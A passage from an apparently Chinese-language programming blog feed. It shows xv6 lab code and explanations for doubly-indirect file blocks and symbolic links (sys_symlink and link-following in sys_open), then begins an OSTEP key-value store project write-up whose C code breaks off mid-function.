</span><span class="token prefix inserted">+</span><span class="token line">  &#125;
</span><span class="token prefix inserted">+</span><span class="token line">
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  ip->size = 0;
</span><span class="token prefix unchanged"> </span><span class="token line">  iupdate(ip);
</span><span class="token prefix unchanged"> </span><span class="token line">&#125;
</span></span>diff --git a/kernel/fs.h b/kernel/fs.h
index 139dcc9..cd5de8a 100644
<span class="token coord">--- a/kernel/fs.h</span>
<span class="token coord">+++ b/kernel/fs.h</span>
@@ -24,9 +24,10 @@ struct superblock &#123;
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">
</span><span class="token prefix unchanged"> </span><span class="token line">#define FSMAGIC 0x10203040
</span><span class="token prefix unchanged"> </span><span class="token line">
</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">#define NDIRECT 12
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">#define NDIRECT 11
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">#define NINDIRECT (BSIZE / sizeof(uint))
</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">#define MAXFILE (NDIRECT + NINDIRECT)
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">#define NINDIRECT2 (NINDIRECT * NINDIRECT)
</span><span class="token prefix inserted">+</span><span class="token line">#define MAXFILE (NDIRECT + NINDIRECT + NINDIRECT2)
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">
</span><span class="token prefix unchanged"> </span><span class="token line">// On-disk inode structure
</span><span class="token prefix unchanged"> </span><span class="token line">struct dinode &#123;
</span></span>@@ -35,7 +36,7 @@ struct dinode &#123;
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  short minor;          // Minor device number (T_DEVICE only)
</span><span class="token prefix unchanged"> </span><span class="token line">  short nlink;          // Number of links to inode in file system
</span><span class="token prefix unchanged"> </span><span class="token line">  uint size;            // Size of file (bytes)
</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">  uint addrs[NDIRECT+1];   // Data block addresses
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  uint addrs[NDIRECT+2];   // Data block addresses
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;;
</span><span class="token prefix unchanged"> </span><span class="token line">
</span><span class="token prefix unchanged"> </span><span class="token line">// Inodes per block.</span></span></code></pre>

<h1 id="Symbolic-links"><a href="#Symbolic-links" class="headerlink" title="Symbolic links"></a>Symbolic links</h1><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>本实验要求为 xv6 实现符号链接（软链接）机制，符号链接本质上也是一个文件，只不过它的数据内容为该链接指向的文件路径，这其实与 Windows 系统的快捷方式十分类似。实现方案如下：</p>
<p>首先依照 Lab System call 中的方法，添加系统调用 <code>symlink</code>：添加 <code>symlink()</code> 声明，添加系统调用号，添加系统调用 entry，添加 <code>sys_symlink()</code> 声明。</p>
<p>在理解了符号链接的本质后，就可以着手实现 <code>sys_symlink</code> 了。首先明确一下 <code>symlink</code> 的作用，它包含两个参数：target 和 path，作用是创建一个目录为 path 的符号链接，该符号链接指向目录为 target 的文件。实现思路应该比较清晰：使用 <code>create()</code> 创建一个文件类型为符号链接（需要自行定义）的文件，再使用 <code>writei()</code> 将字符串 path 写入该文件中。</p>
<pre class="language-c" data-language="c"><code class="language-c">uint64 <span class="token function">sys_symlink</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> n1<span class="token punctuation">,</span> n2<span class="token punctuation">;</span>
    <span class="token keyword">char</span> target<span class="token punctuation">[</span>MAXPATH<span class="token punctuation">]</span><span class="token punctuation">,</span> path<span class="token punctuation">[</span>MAXPATH<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span>ip<span class="token punctuation">;</span>

    <span class="token comment">// get arguments of symlink</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>n1 <span class="token operator">=</span> <span class="token function">argstr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> target<span class="token punctuation">,</span> MAXPATH<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token punctuation">(</span>n2 <span class="token operator">=</span> <span class="token function">argstr</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> path<span class="token punctuation">,</span> MAXPATH<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token function">begin_op</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// create symbol link in the path</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>ip <span class="token operator">=</span> <span class="token function">create</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> T_SYMLINK<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">end_op</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">// write target to file that ip points to</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">writei</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>uint64<span class="token punctuation">)</span>target<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> n1<span class="token punctuation">)</span> <span class="token operator">&lt;</span> n1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">end_op</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">iunlockput</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">end_op</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>实现了符号链接的创建之后，还需要修改 <code>sys_open()</code>，实现对符号链接的特殊处理：当该文件是一个符号链接并且需要以跟随（follow）的方式打开时，就不断向下递归，将当前的 inode 指针指向符号链接指向文件的 inode，直到 inode 指针对应的文件类型不是符号链接，此时该 inode 指针指向的文件才是本次 <code>sys_open()</code> 系统调用实际需要打开的文件。</p>
<p>这里要用到两个关键函数 <code>readi()</code> 和 <code>namei()</code>。其中 <code>readi()</code> 能够根据 inode 指针，从该 inode 指针对应的文件中读取数据；而 <code>namei()</code> 能够根据指定的路径，返回该路径对应文件的 inode 指针。“跟随”的基本流程就是先使用读取当前 inode 中的数据，即目标文件路径 path，再将当前 inode 指针指向 path 目录对应的文件，以此往复。</p>
<p>最后还有一个小细节，就是当多个符号链接形成一个环时，这样的“跟随”过程就可能会导致死循环，因此必须加以限制，这里为了实现的方便，只是设定了一个最大递归深度，当递归深度超过该设定最大值时，文件打开就会失败。</p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>omode <span class="token operator">&amp;</span> O_NOFOLLOW<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> depth <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>     <span class="token comment">// max recursive depth</span>
    <span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span>next<span class="token punctuation">;</span> <span class="token comment">// next inode</span>

    <span class="token keyword">while</span> <span class="token punctuation">(</span>depth <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> ip<span class="token operator">-></span>type <span class="token operator">==</span> T_SYMLINK<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// read data from file that ip points to to path</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">readi</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>uint64<span class="token punctuation">)</span>path<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> MAXPATH<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token function">iunlockput</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">end_op</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token comment">// get inode of file in the path</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>next <span class="token operator">=</span> <span class="token function">namei</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token function">iunlockput</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">end_op</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">iunlockput</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">;</span>
        ip <span class="token operator">=</span> next<span class="token punctuation">;</span>
        <span class="token operator">--</span>depth<span class="token punctuation">;</span>
        <span class="token function">ilock</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>depth <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">iunlockput</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">end_op</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h2 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h2><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/Makefile b/Makefile
index 7a7e380..37a202c 100644
<span class="token coord">--- a/Makefile</span>
<span class="token coord">+++ b/Makefile</span>
@@ -188,6 +188,7 @@ UPROGS=\
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">	$U/_grind\
</span><span class="token prefix unchanged"> </span><span class="token line">	$U/_wc\
</span><span class="token prefix unchanged"> </span><span class="token line">	$U/_zombie\
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">	$U/_symlinktest\
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">
</span><span class="token prefix unchanged"> </span><span class="token line">
</span><span class="token prefix unchanged"> </span><span class="token line">
</span></span>diff --git a/kernel/fcntl.h b/kernel/fcntl.h
index 44861b9..b42df18 100644
<span class="token coord">--- a/kernel/fcntl.h</span>
<span class="token coord">+++ b/kernel/fcntl.h</span>
<span class="token coord">@@ -3,3 +3,4 @@</span>
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">#define O_RDWR    0x002
</span><span class="token prefix unchanged"> </span><span class="token line">#define O_CREATE  0x200
</span><span class="token prefix unchanged"> </span><span class="token line">#define O_TRUNC   0x400
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">#define O_NOFOLLOW 0x800
</span></span>\ No newline at end of file
diff --git a/kernel/stat.h b/kernel/stat.h
index 19543af..46ba47f 100644
<span class="token coord">--- a/kernel/stat.h</span>
<span class="token coord">+++ b/kernel/stat.h</span>
<span class="token coord">@@ -1,6 +1,7 @@</span>
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">#define T_DIR     1   // Directory
</span><span class="token prefix unchanged"> </span><span class="token line">#define T_FILE    2   // File
</span><span class="token prefix unchanged"> </span><span class="token line">#define T_DEVICE  3   // Device
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">#define T_SYMLINK 4   // Symbol link
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">
</span><span class="token prefix unchanged"> </span><span class="token line">struct stat &#123;
</span><span class="token prefix unchanged"> </span><span class="token line">  int dev;     // File system's disk device
</span></span>diff --git a/kernel/syscall.c b/kernel/syscall.c
index c1b3670..1697b62 100644
<span class="token coord">--- a/kernel/syscall.c</span>
<span class="token coord">+++ b/kernel/syscall.c</span>
@@ -104,6 +104,7 @@ extern uint64 sys_unlink(void);
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">extern uint64 sys_wait(void);
</span><span class="token prefix unchanged"> </span><span class="token line">extern uint64 sys_write(void);
</span><span class="token prefix unchanged"> </span><span class="token line">extern uint64 sys_uptime(void);
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">extern uint64 sys_symlink(void);
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">
</span><span class="token prefix unchanged"> </span><span class="token line">static uint64 (*syscalls[])(void) = &#123;
</span><span class="token prefix unchanged"> </span><span class="token line">[SYS_fork]    sys_fork,
</span></span>@@ -127,6 +128,7 @@ static uint64 (*syscalls[])(void) = &#123;
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">[SYS_link]    sys_link,
</span><span class="token prefix unchanged"> </span><span class="token line">[SYS_mkdir]   sys_mkdir,
</span><span class="token prefix unchanged"> </span><span class="token line">[SYS_close]   sys_close,
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">[SYS_symlink] sys_symlink,
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;;
</span><span class="token prefix unchanged"> </span><span class="token line">
</span><span class="token prefix unchanged"> </span><span class="token line">void
</span></span>diff --git a/kernel/syscall.h b/kernel/syscall.h
index bc5f356..0fbf6ed 100644
<span class="token coord">--- a/kernel/syscall.h</span>
<span class="token coord">+++ b/kernel/syscall.h</span>
<span class="token coord">@@ -20,3 +20,4 @@</span>
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">#define SYS_link   19
</span><span class="token prefix unchanged"> </span><span class="token line">#define SYS_mkdir  20
</span><span class="token prefix unchanged"> </span><span class="token line">#define SYS_close  21
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">#define SYS_symlink 22
</span></span>\ No newline at end of file
diff --git a/kernel/sysfile.c b/kernel/sysfile.c
index 5dc453b..ae342c8 100644
<span class="token coord">--- a/kernel/sysfile.c</span>
<span class="token coord">+++ b/kernel/sysfile.c</span>
<span class="token coord">@@ -15,6 +15,7 @@</span>
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">#include "sleeplock.h"
</span><span class="token prefix unchanged"> </span><span class="token line">#include "file.h"
</span><span class="token prefix unchanged"> </span><span class="token line">#include "fcntl.h"
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">#include "buf.h"
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">
</span><span class="token prefix unchanged"> </span><span class="token line">// Fetch the nth word-sized system call argument as a file descriptor
</span><span class="token prefix unchanged"> </span><span class="token line">// and return both the descriptor and the corresponding struct file.
</span></span>@@ -316,6 +317,35 @@ sys_open(void)
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    &#125;
</span><span class="token prefix unchanged"> </span><span class="token line">  &#125;
</span><span class="token prefix unchanged"> </span><span class="token line">
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  if (!(omode &amp; O_NOFOLLOW)) &#123;
</span><span class="token prefix inserted">+</span><span class="token line">    int depth = 10;
</span><span class="token prefix inserted">+</span><span class="token line">    struct inode *next;
</span><span class="token prefix inserted">+</span><span class="token line">
</span><span class="token prefix inserted">+</span><span class="token line">    while (depth > 0 &amp;&amp; ip->type == T_SYMLINK) &#123;
</span><span class="token prefix inserted">+</span><span class="token line">      if (readi(ip, 0, (uint64)path, 0, MAXPATH) == 0) &#123;
</span><span class="token prefix inserted">+</span><span class="token line">        iunlockput(ip);
</span><span class="token prefix inserted">+</span><span class="token line">        end_op();
</span><span class="token prefix inserted">+</span><span class="token line">        return -1;
</span><span class="token prefix inserted">+</span><span class="token line">      &#125;
</span><span class="token prefix inserted">+</span><span class="token line">
</span><span class="token prefix inserted">+</span><span class="token line">      if ((next = namei(path)) == 0) &#123;
</span><span class="token prefix inserted">+</span><span class="token line">        iunlockput(ip);
</span><span class="token prefix inserted">+</span><span class="token line">        end_op();
</span><span class="token prefix inserted">+</span><span class="token line">        return -1;
</span><span class="token prefix inserted">+</span><span class="token line">      &#125;
</span><span class="token prefix inserted">+</span><span class="token line">      iunlockput(ip);
</span><span class="token prefix inserted">+</span><span class="token line">      ip = next;
</span><span class="token prefix inserted">+</span><span class="token line">      --depth;
</span><span class="token prefix inserted">+</span><span class="token line">      ilock(ip);
</span><span class="token prefix inserted">+</span><span class="token line">    &#125;
</span><span class="token prefix inserted">+</span><span class="token line">
</span><span class="token prefix inserted">+</span><span class="token line">    if (depth &lt;= 0) &#123;
</span><span class="token prefix inserted">+</span><span class="token line">      iunlockput(ip);
</span><span class="token prefix inserted">+</span><span class="token line">      end_op();
</span><span class="token prefix inserted">+</span><span class="token line">      return -1;
</span><span class="token prefix inserted">+</span><span class="token line">    &#125;
</span><span class="token prefix inserted">+</span><span class="token line">  &#125;
</span><span class="token prefix inserted">+</span><span class="token line">
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  if(ip->type == T_DEVICE &amp;&amp; (ip->major &lt; 0 || ip->major >= NDEV))&#123;
</span><span class="token prefix unchanged"> </span><span class="token line">    iunlockput(ip);
</span><span class="token prefix unchanged"> </span><span class="token line">    end_op();
</span></span>@@ -484,3 +514,28 @@ sys_pipe(void)
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  &#125;
</span><span class="token prefix unchanged"> </span><span class="token line">  return 0;
</span><span class="token prefix unchanged"> </span><span class="token line">&#125;
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">
</span><span class="token prefix inserted">+</span><span class="token line">uint64 sys_symlink(void) &#123;
</span><span class="token prefix inserted">+</span><span class="token line">  int n1, n2;
</span><span class="token prefix inserted">+</span><span class="token line">  char target[MAXPATH], path[MAXPATH];
</span><span class="token prefix inserted">+</span><span class="token line">  struct inode *ip;
</span><span class="token prefix inserted">+</span><span class="token line">
</span><span class="token prefix inserted">+</span><span class="token line">  if ((n1 = argstr(0, target, MAXPATH)) &lt; 0 || (n2 = argstr(1, path, MAXPATH)) &lt; 1) &#123;
</span><span class="token prefix inserted">+</span><span class="token line">    return -1;
</span><span class="token prefix inserted">+</span><span class="token line">  &#125;
</span><span class="token prefix inserted">+</span><span class="token line">  
</span><span class="token prefix inserted">+</span><span class="token line">  // create symbol link in the path
</span><span class="token prefix inserted">+</span><span class="token line">  begin_op();
</span><span class="token prefix inserted">+</span><span class="token line">  if ((ip = create(path, T_SYMLINK, 0, 0)) == 0) &#123;
</span><span class="token prefix inserted">+</span><span class="token line">    end_op();
</span><span class="token prefix inserted">+</span><span class="token line">    return -1;
</span><span class="token prefix inserted">+</span><span class="token line">  &#125;
</span><span class="token prefix inserted">+</span><span class="token line">  if (writei(ip, 0, (uint64)target, 0, n1) &lt; n1) &#123;
</span><span class="token prefix inserted">+</span><span class="token line">    end_op();
</span><span class="token prefix inserted">+</span><span class="token line">    return -1;
</span><span class="token prefix inserted">+</span><span class="token line">  &#125;
</span><span class="token prefix inserted">+</span><span class="token line">  iunlockput(ip);
</span><span class="token prefix inserted">+</span><span class="token line">  end_op();
</span><span class="token prefix inserted">+</span><span class="token line">
</span><span class="token prefix inserted">+</span><span class="token line">  return 0;
</span><span class="token prefix inserted">+</span><span class="token line">&#125;
</span></span>\ No newline at end of file
diff --git a/user/user.h b/user/user.h
index b71ecda..883ef48 100644
<span class="token coord">--- a/user/user.h</span>
<span class="token coord">+++ b/user/user.h</span>
@@ -23,6 +23,7 @@ int getpid(void);
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">char* sbrk(int);
</span><span class="token prefix unchanged"> </span><span class="token line">int sleep(int);
</span><span class="token prefix unchanged"> </span><span class="token line">int uptime(void);
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">int symlink(char *, char *);
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">
</span><span class="token prefix unchanged"> </span><span class="token line">// ulib.c
</span><span class="token prefix unchanged"> </span><span class="token line">int stat(const char*, struct stat*);
</span></span>diff --git a/user/usys.pl b/user/usys.pl
index 01e426e..65a8d6b 100755
<span class="token coord">--- a/user/usys.pl</span>
<span class="token coord">+++ b/user/usys.pl</span>
@@ -36,3 +36,4 @@ entry("getpid");
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">entry("sbrk");
</span><span class="token prefix unchanged"> </span><span class="token line">entry("sleep");
</span><span class="token prefix unchanged"> </span><span class="token line">entry("uptime");
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">entry("symlink");
</span></span>\ No newline at end of file</code></pre>

]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>经验</tag>
        <tag>操作系统</tag>
        <tag>xv6</tag>
      </tags>
  </entry>
  <entry>
    <title>OSTEP Projects：KV</title>
    <url>/2024/05/08/OSTEP%20Projects%EF%BC%9AKV/</url>
    <content><![CDATA[<p>本文将介绍操作系统导论（Operating Systems: Three Easy Pieces）作者所开源的操作系统相关<a href="https://github.com/remzi-arpacidusseau/ostep-projects">课程项目</a> 的 KV 部分，包含个人的代码实现和设计思路。</p>
<span id="more"></span>

<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>题目要求实现一个最简单的数据库，以支持数据的持久化。</p>
<p>每个操作由格式为 <code>op,[arg1],[arg2]</code> 的命令给出，那么首先要解决的问题就是参数的分离，再根据操作符 op 来对不同的操作进行特殊处理。字符串划分这里采用的是 <code>strsep()</code> 函数：该函数接收两个参数 <code>char** stringp</code> 和 <code>const char* delim</code>，<code>stringp</code> 是指向待分割字符串 <code>string</code> 的指针，<code>delim</code> 则是指定的分隔符，该函数的操作是查找 <code>string</code> 中第一个 <code>delim</code> 的位置 <code>it</code>，并将 <code>stringp</code> 指向 <code>string</code> 中 <code>it + 1</code> 的位置，同时返回<code>string</code> 开头到  <code>it</code> 所有字符所构成的子串（加上 <code>&#39;\0&#39;</code> 终结符）。</p>
<p>插入操作没什么好说的，直接使用 <code>fprintf()</code> 写入文件即可。对于查找和删除，则需要将数据从文件（数据库）中读取到内存，存储在特定的数据结构中，例如哈希表、红黑树等，但为了代码实现的简单，我使用的是最简单的链表。对于查找，先将所有数据读取到一个链表中，然后按顺序逐个进行查找；对于删除，将所有数据读取到一个链表中，然后逐个遍历链表，如果当前结点的键（key）与参数不同，则写入文件中，否则，不写入（相当于删除）。最后，为了防止内存的泄露，需要在每次结束查找和删除操作之后，将存储数据内容的链表结点的内存空间释放。</p>
<h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DATA_BASE</span> <span class="token string">"./database.txt"</span></span>

<span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">LineNode</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">char</span><span class="token operator">*</span> line_buf<span class="token punctuation">;</span>
	<span class="token keyword">struct</span> <span class="token class-name">LineNode</span><span class="token operator">*</span> next<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> line_node<span class="token punctuation">;</span>

<span class="token comment">// 从文件fp中读取数据</span>
line_node<span class="token operator">*</span> <span class="token function">read_from_file</span><span class="token punctuation">(</span>FILE<span class="token operator">*</span> fp<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	line_node<span class="token operator">*</span> dummy <span class="token operator">=</span> <span class="token punctuation">(</span>line_node<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>line_node<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 哨兵结点</span>
	line_node<span class="token operator">*</span> p <span class="token operator">=</span> dummy<span class="token punctuation">;</span>
	<span class="token class-name">size_t</span> sz <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		p<span class="token operator">-></span>next <span class="token operator">=</span> <span class="token punctuation">(</span>line_node<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>line_node<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		p <span class="token operator">=</span> p<span class="token operator">-></span>next<span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getline</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token punctuation">(</span>p<span class="token operator">-></span>line_buf<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>sz<span class="token punctuation">,</span> fp<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			p<span class="token operator">-></span>next <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
			<span class="token keyword">break</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">return</span> dummy<span class="token operator">-></span>next<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">// 释放链表内存空间</span>
<span class="token keyword">void</span> <span class="token function">free_list_mem</span><span class="token punctuation">(</span>line_node<span class="token operator">*</span> data<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">while</span> <span class="token punctuation">(</span>data <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		line_node<span class="token operator">*</span> temp <span class="token operator">=</span> data<span class="token punctuation">;</span>
		data <span class="token operator">=</span> data<span class="token operator">-></span>next<span class="token punctuation">;</span>
		<span class="token function">free</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> argc<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">char</span><span class="token operator">*</span> op <span class="token operator">=</span> <span class="token function">strsep</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 操作符</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>op<span class="token punctuation">,</span> <span class="token string">"p"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
